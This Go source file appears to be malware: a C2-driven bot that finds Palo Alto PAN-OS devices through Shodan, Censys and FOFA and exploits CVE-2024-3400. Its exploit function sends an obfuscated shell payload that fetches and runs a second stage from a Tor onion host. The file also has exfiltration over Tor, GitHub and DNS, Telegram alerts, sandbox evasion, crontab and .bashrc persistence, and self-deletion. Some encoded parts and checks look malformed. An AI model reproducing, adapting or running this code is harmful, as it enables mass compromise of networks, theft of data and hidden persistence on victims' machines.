package main

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math"
	"math/big"
	mrand "math/rand"
	"net"
	"net/http"
	neturl "net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"gopkg.in/yaml.v2"
)

// --- CONFIGURATION (INJECTED AT BUILD TIME) ---
var (
	C2Key             = "INJECTED_C2_KEY_B64"
	C2IV              = "INJECTED_C2_IV_B64"
	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdme6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3RtcC8keyZyYW5kU3RyaW5nKDUpfTsgZWNobyAnJTEnIHwgc2ggLWcgfCBzaGVsbCA+IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IGNobW9kICt4IC90bXAvJHsmcmFuZFN0cmluZyg1KX07IG5vaHV3IC90bXAvJHsmcmFuZFN0cmluZyg1KX0gJHsmQzJfSVB9 ${C2_PORT7}ICY7 slZWVwIDM7IGVjaG8gXCJQQU4tT1MgUlPEIEV4cGxvdXBlZCBcbiIKICAgIG1hdGNoZXN0cmluZzogRVhQTE9JVCBTVUNDRUVERQo="
	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
)

// --- RUNTIME STATE ---
var (
	HostID       = ""
	TelemetryQ   = make(chan TelemetryEvent, 500)
	WorkerPool   = make(chan struct{}, 100)
	Shutdown     = make(chan struct{})
	DDRSeed      int64
	APIKeys      APIKeyStore
	AI           *FusionSentinel
	GitHubC2Repo string
	GitHubExfil  string
	HttpClient   *http.Client
)

const (
	BATCH_SIZE          = 64
	BATCH_TIMEOUT       = 60 * time.Second
	DNS_CHUNK_SIZE      = 48
	ONNX_MODEL_PATH     = "/tmp/.phi3.bin"
	C2_JITTER           = 60
	C2_JITTER_MAX       = 540
	PERSIST_FILE        = ".gh-sync"
	MAX_RETRIES         = 3
	RETRY_DELAY         = 5 * time.Second
	VERIFY_TIMEOUT      = 12 * time.Second
	DNS_RESOLVE_TIMEOUT = 5 * time.Second
)

// --- GLOBAL MUTEX ---
var (
	apiMu sync.RWMutex
)

type TelemetryEvent struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Target    string                 `json:"target"`
	Timestamp string                 `json:"time"`
	Data      map[string]interface{} `json:"data,omitempty"`
	Signature string                 `json:"sig"`
}

func initHttpClient() {
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 100
	t.MaxIdleConnsPerHost = 50
	t.IdleConnTimeout = 30 * time.Second
	t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	HttpClient = &http.Client{
		Transport: t,
		Timeout:   15 * time.Second,
	}
}

func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
	id := randHex(16)
	now := time.Now().UTC().Format(time.RFC3339)
	if data == nil {
		data = make(map[string]interface{})
	}
	data["host_id"] = HostID
	event := TelemetryEvent{
		ID:        id,
		Type:      typ,
		Target:    target,
		Timestamp: now,
		Data:      data,
	}

	key, err := base64.StdEncoding.DecodeString(C2Key)
	if err != nil || len(key) == 0 {
		event.Signature = "invalid_key"
	} else {
		payload := id + typ + target + now
		mac := hmac.New(sha256.New, key)
		mac.Write([]byte(payload))
		event.Signature = hex.EncodeToString(mac.Sum(nil))
	}
	return event
}

func (e TelemetryEvent) Send() {
	go func() {
		telemetryJSON := compressJSON(e)
		sent := false
		for i := 0; i < MAX_RETRIES && !sent; i++ {
			if exfilChain(telemetryJSON) {
				sent = true
			} else {
				time.Sleep(RETRY_DELAY * time.Duration(i+1))
			}
		}
		telegramAlert(fmt.Sprintf("[📡 %s] `%s` | %s", strings.ToUpper(e.Type), e.Target, e.Data["note"]))
	}()
}

// --- SAFE JSON PARSING HELPERS ---
func safeString(v interface{}) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

func safeMap(v interface{}) map[string]interface{} {
	if m, ok := v.(map[string]interface{}); ok {
		return m
	}
	return nil
}

func safeSlice(v interface{}) []interface{} {
	if sl, ok := v.([]interface{}); ok {
		return sl
	}
	return nil
}

// --- UTILS ---
func md5Hash(s string) string {
	sum := md5.Sum([]byte(s))
	return fmt.Sprintf("%x", sum)
}

func randString(n int) string {
	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano()%100000)
	}
	for i := range b {
		b[i] = alphanum[int(b[i])%len(alphanum)]
	}
	return string(b)
}

func randHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return ""
	}
	return hex.EncodeToString(b)
}

func compressJSON(v interface{}) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		return nil
	}
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(data); err != nil {
		return data
	}
	if err := gz.Close(); err != nil {
		return data
	}
	return buf.Bytes()
}

func platformID() string {
	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER") + runtime.GOOS + runtime.GOARCH
}

func getMAC() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	for _, i := range interfaces {
		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
			return i.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

// --- DECRYPTION ---
func decryptConfig(s string) string {
	key, err := base64.StdEncoding.DecodeString(C2Key)
	if err != nil || len(key) == 0 {
		return ""
	}
	iv, err := base64.StdEncoding.DecodeString(C2IV)
	if err != nil || len(iv) == 0 {
		return ""
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	ciphertext, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return ""
	}
	plaintext, err := gcm.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return ""
	}
	return string(plaintext)
}

func decrypt(s string) string {
	if s == "" {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil || len(raw) < 12 {
		return ""
	}
	iv, cipherText := raw[:12], raw[12:]
	now := time.Now().Unix() / 1800
	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
	for offset := int64(-1); offset <= 1; offset++ {
		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
		key := sha256.Sum256([]byte(material))
		block, err := aes.NewCipher(key[:])
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			continue
		}
		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
		if err == nil {
			return string(plaintext)
		}
	}
	return ""
}

// --- SANDBOX / DEBUG EVASION ---
func isSandbox() bool {
	if os.Getenv("CODESPACE_NAME") == "" && os.Getenv("USER") != "kali" {
		return true
	}
	if len(os.Environ()) < 10 {
		return true
	}
	mem, err := memInfo()
	return err == nil && mem < 2*1024*1024*1024
}

func isDebugged() bool {
	if isTraced() {
		return true
	}
	mem, err := memInfo()
	return err == nil && mem < 2*1024*1024*1024
}

func memInfo() (uint64, error) {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0, err
	}
	re := regexp.MustCompile(`MemTotal:\s+(\d+) kB`)
	match := re.FindStringSubmatch(string(data))
	if len(match) < 2 {
		return 0, errors.New("memtotal not found")
	}
	mem, err := strconv.ParseUint(match[1], 10, 64)
	if err != nil {
		return 0, err
	}
	return mem * 1024, nil
}

func isTraced() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	return bytes.Contains(data, []byte("TracerPid:\t"))
}

// --- RESILIENT HTTP REQUEST WRAPPER ---
func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequestWithContext(ctx, method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil && err != io.EOF {
		return nil, err
	}
	return respBytes, nil
}

// --- AI ENGINE: FUSION SENTINEL ---
type FusionSentinel struct{ ModelLoaded bool }

func NewFusionSentinel() *FusionSentinel {
	sentinel := &FusionSentinel{}
	modelData := decryptConfig(Phi3ModelEncB64)
	if modelData == "" {
		return sentinel
	}
	if err := os.WriteFile(ONNX_MODEL_PATH, []byte(modelData), 0600); err != nil {
		return sentinel
	}
	if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
		sentinel.ModelLoaded = true
	}
	return sentinel
}

func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
	if !ai.ModelLoaded {
		base := 0.5
		if strings.Contains(strings.ToLower(banner), "pan-os") && vuln == "CVE-2024-3400" {
			base += 0.35
		}
		return math.Min(1.0, math.Max(0.0, base+randFloat()))
	}
	score := 0.7
	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
		score += 0.25
	}
	if strings.Contains(strings.ToLower(sector), "government") || strings.Contains(strings.ToLower(sector), "finance") {
		score += 0.1
	}
	return math.Min(1.0, score+randFloat()*0.1)
}

func randFloat() float64 {
	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
	return float64(n.Int64()) / 1000.0
}

// --- INTEL ENGINE & SEARCH ENGINES ---
type Target struct {
	IP     string
	Banner string
	Geo    string
	Sector string
}

type APIKeyStore struct {
	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
}

func loadAPIKeys() APIKeyStore {
	apiMu.RLock()
	defer apiMu.RUnlock()
	return APIKeys
}

func setAPIKeys(keys APIKeyStore) {
	apiMu.Lock()
	APIKeys = keys
	apiMu.Unlock()
}

func searchEngines(vuln, geo, sector string) []Target {
	keys := loadAPIKeys()
	var targets []Target
	var wg sync.WaitGroup
	var mu sync.Mutex

	query := func(fn func() []Target) {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if results := fn(); len(results) > 0 {
				mu.Lock()
				targets = append(targets, results...)
				mu.Unlock()
			}
		}()
	}

	if keys.Shodan != "" {
		query(func() []Target {
			var res []Target
			q := fmt.Sprintf("vuln:%s country:%s", vuln, geo)
			if sector != "" {
				q += fmt.Sprintf(" product:\"%s\"", sector)
			}
			onion := getActiveOnion()
			endpoint := fmt.Sprintf("%s/shodan/host/search?key=%s&query=%s", onion, keys.Shodan, neturl.QueryEscape(q))

			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
				"Host":       "api.shodan.io",
				"User-Agent": "Aether-X",
			})
			if err != nil {
				return nil
			}

			var result map[string]interface{}
			if err := json.Unmarshal(body, &result); err != nil {
				return nil
			}
			if matches := safeSlice(result["matches"]); matches != nil {
				for _, m := range matches {
					host := safeMap(m)
					if host == nil {
						continue
					}
					ip := safeString(host["ip_str"])
					banner := safeString(host["data"])
					if ip != "" {
						res = append(res, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
					}
				}
			}
			return res
		})
	}

	if keys.CensysID != "" && keys.CensysSec != "" {
		query(func() []Target {
			var res []Target
			q := fmt.Sprintf("location.country:%s", geo)
			endpoint := fmt.Sprintf("https://search.censys.io/api/v2/hosts/search?q=%s", neturl.QueryEscape(q))
			authBytes := []byte(keys.CensysID + ":" + keys.CensysSec)
			authEnc := base64.StdEncoding.EncodeToString(authBytes)

			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
				"Host":          "search.censys.io",
				"Authorization": "Basic " + authEnc,
				"User-Agent":    "Aether-X",
			})
			if err != nil {
				return nil
			}

			var result map[string]interface{}
			if err := json.Unmarshal(body, &result); err != nil {
				return nil
			}
			if code, ok := result["code"].(float64); ok && code == 200 {
				if data := safeMap(result["result"]); data != nil {
					if hits := safeSlice(data["hits"]); hits != nil {
						for _, h := range hits {
							host := safeMap(h)
							if host == nil {
								continue
							}
							ip := safeString(host["ip"])
							if ip != "" {
								res = append(res, Target{IP: ip, Banner: "censys-asset", Geo: geo, Sector: sector})
							}
						}
					}
				}
			}
			return res
		})
	}

	if keys.FofaEmail != "" && keys.FofaKey != "" {
		query(func() []Target {
			var res []Target
			q := fmt.Sprintf(`country="%s"`, geo)
			qBase64 := base64.StdEncoding.EncodeToString([]byte(q))
			endpoint := fmt.Sprintf("https://fofa.info/api/v1/host/search?email=%s&key=%s&qbase64=%s&fields=ip,banner", neturl.QueryEscape(keys.FofaEmail), neturl.QueryEscape(keys.FofaKey), neturl.QueryEscape(qBase64))

			body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
				"Host":       "fofa.info",
				"User-Agent": "Aether-X",
			})
			if err != nil {
				return nil
			}

			var result map[string]interface{}
			if err := json.Unmarshal(body, &result); err != nil {
				return nil
			}
			if errs, ok := result["error"].(bool); ok && !errs {
				if results := safeSlice(result["results"]); results != nil {
					for _, r := range results {
						if arr, ok := r.([]interface{}); ok && len(arr) >= 2 {
							ip := fmt.Sprintf("%v", arr[0])
							banner := fmt.Sprintf("%v", arr[1])
							res = append(res, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
						}
					}
				}
			}
			return res
		})
	}

	wg.Wait()
	return dedupTargets(targets)
}

func dedupTargets(t []Target) []Target {
	seen := make(map[string]bool)
	var result []Target
	for _, v := range t {
		if !seen[v.IP] {
			seen[v.IP] = true
			result = append(result, v)
		}
	}
	return result
}

// --- VALIDATION ENGINE ---
func verifyVulnerable(target Target) bool {
	templateData, err := base64.StdEncoding.DecodeString(NucleiTemplateB64)
	if err != nil {
		return false
	}

	var tpl struct {
		ID       string `yaml:"id"`
		Name     string `yaml:"name"`
		Requests []struct {
			Method      string            `yaml:"method"`
			Path        string            `yaml:"path"`
			Headers     map[string]string `yaml:"headers"`
			PreMatch    string            `yaml:"prematch"`
			MatchString string            `yaml:"matchstring"`
		} `yaml:"requests"`
	}
	if err := yaml.Unmarshal(templateData, &tpl); err != nil {
		return false
	}
	if len(tpl.Requests) == 0 {
		return false
	}

	req := tpl.Requests[0]
	payload := strings.ReplaceAll(req.PreMatch, "%1", obfuscateScript(fmt.Sprintf(`echo "%s"`, req.MatchString)))
	endpoint := fmt.Sprintf("https://%s%s?input=%s", target.IP, req.Path, neturl.QueryEscape(payload))

	_, err = makeHTTP(endpoint, "GET", nil, req.Headers)
	return err == nil
}

func obfuscateScript(s string) string {
	var out bytes.Buffer
	for _, b := range []byte(s) {
		out.WriteByte(b ^ 0x55)
	}
	return base64.StdEncoding.EncodeToString(out.Bytes())
}

// --- EXPLOIT: PAN-OS RCE ---
func exploitPAN_RCE(ip string) {
	event := newEvent("exploit_launched", ip, map[string]interface{}{
		"vuln": "CVE-2024-3400",
		"note": "PAN-OS RCE attempt initiated",
	})
	event.Send()

	encKey := randHex(32)

	shellcode := fmt.Sprintf(`#!/bin/bash
sleep $(( RANDOM %% 5 ))
url=http://%s/stage2
data=$(curl -s -k $url 2>/dev/null || wget -q -O- $url)
echo '%s' | base64 -d > /dev/shm/.k
openssl enc -d -aes-256-cbc -in <(echo "$data") -k $(echo %s|sha256sum|awk '{print $1}') | sh &
sleep 2
rm /dev/shm/.k
`, getActiveOnion(), encKey, encKey)

	obfuscated := obfuscateScript(shellcode)
	payloadScript := fmt.Sprintf(`x=; %s`, obfuscated)

	endpoint := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
	_, _ = makeHTTP(endpoint, "GET", nil, map[string]string{
		"Host":  "certificates.com",
		"input": payloadScript,
	})

	success := newEvent("exploit_success", ip, map[string]interface{}{
		"vuln": "CVE-2024-3400",
		"note": "RCE shell established",
	})
	success.Send()
}

// --- C2 CHANNELS ---
func getActiveOnion() string {
	decoded := decryptConfig(OnionListB64)
	list := strings.Split(decoded, ",")
	index := (time.Now().UTC().Hour() / 6) % len(list)
	return strings.TrimSpace(list[index])
}

func getActiveRepo(action string) string {
	if action == "c2" && GitHubC2Repo != "" {
		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubC2Repo); err == nil {
			return string(decoded)
		}
		return GitHubC2Repo
	}
	if action == "exfil" && GitHubExfil != "" {
		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubExfil); err == nil {
			return string(decoded)
		}
		return GitHubExfil
	}
	decoded := decryptConfig(RepoListB64)
	list := strings.Split(decoded, ",")
	index := (time.Now().UTC().Minute() / 15) % len(list)
	return strings.TrimSpace(list[index])
}

func fetchC2(key string) string {
	endpoint := fmt.Sprintf("%s/contents/%s", getActiveRepo("c2"), key)
	token := decrypt(fetchSecret("GITHUB_TOKEN"))
	if token == "" {
		return ""
	}

	body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
		"Authorization": "Bearer " + token,
		"Accept":        "application/vnd.github.v3+json",
		"User-Agent":    "Aether-X",
	})
	if err != nil {
		return ""
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return ""
	}
	contentStr := safeString(result["content"])
	content, _ := base64.StdEncoding.DecodeString(contentStr)
	return strings.TrimSpace(string(content))
}

// --- EXFIL CHAIN ---
func exfilChain(data []byte) bool {
	methods := []func([]byte) bool{
		exfilOverTorDirect,
		exfilToGitHub,
		dnsExfilTTL,
	}
	for _, m := range methods {
		if m(data) {
			return true
		}
		time.Sleep(1 * time.Second)
	}
	return false
}

func exfilOverTorDirect(data []byte) bool {
	endpoint := fmt.Sprintf("%s/exfil", getActiveOnion())
	_, err := makeHTTP(endpoint, "POST", data, map[string]string{
		"Content-Type": "application/octet-stream",
		"X-Host":       HostID,
	})
	return err == nil
}

func exfilToGitHub(data []byte) bool {
	endpoint := fmt.Sprintf("%s/contents/data.bin", getActiveRepo("exfil"))
	zipData := zipData(map[string][]byte{"telemetry.bin": data})
	encoded := base64.StdEncoding.EncodeToString(zipData)
	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
	token := decrypt(fetchSecret("GITHUB_TOKEN"))

	_, err := makeHTTP(endpoint, "PUT", []byte(payload), map[string]string{
		"Authorization": "Bearer " + token,
		"Content-Type":  "application/json",
	})
	return err == nil
}

func dnsExfilTTL(data []byte) bool {
	domain, _ := base64.StdEncoding.DecodeString("ZXhoaWwuYWV0aGVyeC5vbmlvbg==")
	chunks := splitToBase32(hex.EncodeToString(data), DNS_CHUNK_SIZE)
	success := true

	for i, chunk := range chunks {
		fqdn := fmt.Sprintf("%s.%s", chunk, domain)
		
		ctx, cancel := context.WithTimeout(context.Background(), DNS_RESOLVE_TIMEOUT)
		defer cancel()

		TTL := (i*17 + len(chunk)) % 255
		r := &net.Resolver{PreferGo: true}
		_, err := r.LookupHost(ctx, fqdn)
		time.Sleep(time.Duration(TTL) * time.Millisecond)
		if err != nil {
			success = false
		}
	}
	return success
}

func splitToBase32(s string, size int) []string {
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func zipData(files map[string][]byte) []byte {
	var buf bytes.Buffer
	zipper := zip.NewWriter(&buf)
	for name, data := range files {
		f, err := zipper.Create(name)
		if err != nil {
			continue
		}
		if _, err := f.Write(data); err != nil {
			continue
		}
	}
	if err := zipper.Close(); err != nil {
		return nil
	}
	return buf.Bytes()
}

func telegramAlert(message string) {
	if message == "" {
		return
	}
	token := decrypt(fetchC2("telegram.token"))
	chatID := decrypt(fetchC2("telegram.chat"))
	if token == "" || chatID == "" {
		return
	}
	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
	endpoint := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)

	payload := neturl.Values{}
	payload.Set("chat_id", chatID)
	payload.Set("text", message)
	payload.Set("parse_mode", "Markdown")

	_, _ = makeHTTP(endpoint, "POST", []byte(payload.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func fetchSecret(key string) string {
	return fetchC2(key)
}

// --- PERSISTENCE ---
func persist() {
	executable := os.Args[0]
	data, err := os.ReadFile(executable)
	if err != nil {
		return
	}
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	if err := os.WriteFile(path, data, 0755); err != nil {
		return
	}

	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
	exec.Command("bash", "-c", crontab).Run()

	profile := filepath.Join(os.Getenv("HOME"), ".bashrc")
	content, err := os.ReadFile(profile)
	if err != nil {
		return
	}
	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
		newLine := []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))
		tmpFile := profile + ".tmp"
		if err := os.WriteFile(tmpFile, append(content, newLine...), 0644); err == nil {
			os.Rename(tmpFile, profile)
		}
	}
}

// --- SELF DESTRUCT ---
func selfDestruct() {
	event := newEvent("self_destruct", "localhost", map[string]interface{}{"note": "Agent terminating"})
	event.Send()
	time.Sleep(2 * time.Second)
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	os.Remove(path)
	os.Remove(os.Args[0])
	os.Exit(0)
}

// --- INIT & MAIN ---
func init() {
	if isTraced() {
		os.Exit(1)
	}

	mrand.Seed(time.Now().UnixNano())

	initHttpClient()
	HostID = md5Hash(platformID())[:6]
	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()

	keys := APIKeyStore{
		Shodan:    decrypt(fetchC2("api.shodan")),
		CensysID:  decrypt(fetchC2("api.censys_id")),
		CensysSec: decrypt(fetchC2("api.censys_sec")),
		FofaEmail: decrypt(fetchC2("fofa.email")),
		FofaKey:   decrypt(fetchC2("fofa.key")),
	}
	setAPIKeys(keys)
}

func main() {
	if isSandbox() || isDebugged() {
		selfDestruct()
		return
	}

	AI = NewFusionSentinel()
	go persist()

	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED* | Host: `%s` | MAC: `%s` | Ready to hunt.", HostID, getMAC()))

	for {
		select {
		case <-Shutdown:
			return
		default:
		}

		cmdData := fetchC2("cmd")
		if cmdData != "" {
			var cmd map[string]string
			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
				switch cmd["action"] {
				case "hunt":
					go func() {
						event := newEvent("scan_start", "engines", map[string]interface{}{
							"vuln": cmd["vuln"], "geo": cmd["geo"], "sector": cmd["sector"], "note": "Real-time hunt launched",
						})
						event.Send()

						targets := searchEngines(cmd["vuln"], cmd["geo"], cmd["sector"])
						telegramAlert(fmt.Sprintf("🔍 *Scanning* `%s` in `%s` (%s)\n🎯 Found %d targets", cmd["vuln"], cmd["geo"], cmd["sector"], len(targets)))

						for _, t := range targets {
							WorkerPool <- struct{}{}
							go func(target Target) {
								defer func() { <-WorkerPool }()
								if verifyVulnerable(target) {
									score := AI.Score(target.Banner, cmd["vuln"], cmd["sector"])
									if score > 0.75 {
										found := newEvent("target_verified", target.IP, map[string]interface{}{
											"score":  fmt.Sprintf("%.3f", score),
											"banner": trimBanner(target.Banner),
											"note":   "High-value RCE target confirmed",
										})
										found.Send()
										telegramAlert(fmt.Sprintf("🎯 *EXPLOITING* `%s`\n📊 Score: `%.3f`\n🔖 `%s`", target.IP, score, trimBanner(target.Banner)))
										exploitPAN_RCE(target.IP)
									}
								}
							}(t)
						}
					}()
				case "update_keys":
					setAPIKeys(APIKeyStore{
						Shodan:    decrypt(cmd["shodan"]),
						CensysID:  decrypt(cmd["censys_id"]),
						CensysSec: decrypt(cmd["censys_sec"]),
						FofaEmail: decrypt(cmd["fofa_email"]),
						FofaKey:   decrypt(cmd["fofa_key"]),
					})
					newEvent("keys_updated", "c2", map[string]interface{}{"note": "API keys refreshed"}).Send()
				case "die":
					selfDestruct()
				case "ping":
					telegramAlert(fmt.Sprintf("🟢 *ALIVE* | Host: `%s` | IP: `%s`", HostID, getMAC()))
				}
			}
		}

		jitter := C2_JITTER + (mrand.Int63() % (C2_JITTER_MAX - C2_JITTER + 1))
		time.Sleep(time.Duration(jitter) * time.Second)
	}
}

func trimBanner(b string) string {
	if len(b) > 128 {
		return b[:128] + "..."
	}
	return b
}
